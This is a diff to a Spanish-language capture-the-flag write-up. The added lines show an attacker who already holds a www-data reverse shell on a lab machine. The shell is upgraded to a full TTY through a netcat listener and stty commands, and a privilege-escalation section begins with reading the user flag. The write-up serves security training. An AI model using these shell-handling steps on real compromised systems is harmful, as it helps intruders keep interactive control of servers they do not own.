@@ -211,7 +211,36 @@ Nos ponemos en escucha en nuestra maquina y ejecutamos la url anterior.
 	uid=33(www-data) gid=33(www-data) groups=33(www-data)
 	www-data@sky:/var/www/html/v2/profileimages$ 
 
-  
+  Upgradeamos la shell para obtener una full tty
+
+	www-data@sky:/var/www/html/v2/profileimages$ SHELL=/bin/bash script -q /dev/null
+	</profileimages$ SHELL=/bin/bash script -q /dev/null
+ 
+	www-data@sky:/var/www/html/v2/profileimages$ ^Z
+	zsh: suspended  nc -lnvp 1988
+	                                                                                                                                   
+	┌──(root㉿kali)-[/home/kali/Desktop/ctf/road]
+	└─# stty raw -echo && fg
+	[1]  + continued  nc -lnvp 1988
+	
+	www-data@sky:/var/www/html/v2/profileimages$ export TERM=xterm-256color
+ 
+	www-data@sky:/var/www/html/v2/profileimages$ stty rows 42 columns 131
+
+## Post Explotacion Escalada de privilegios usuario www-data to webdeveloper.
+
+Primero obtenemos la flag user.txt
+
+	www-data@sky:/var/www/html/v2/profileimages$ whoami 
+	www-data
+	
+	www-data@sky:/home/webdeveloper$ ls
+	user.txt
+ 
+	www-data@sky:/home/webdeveloper$ cat user.txt
+	63191e4ece3752[...]62a5e64d45
+
+
 
 
 
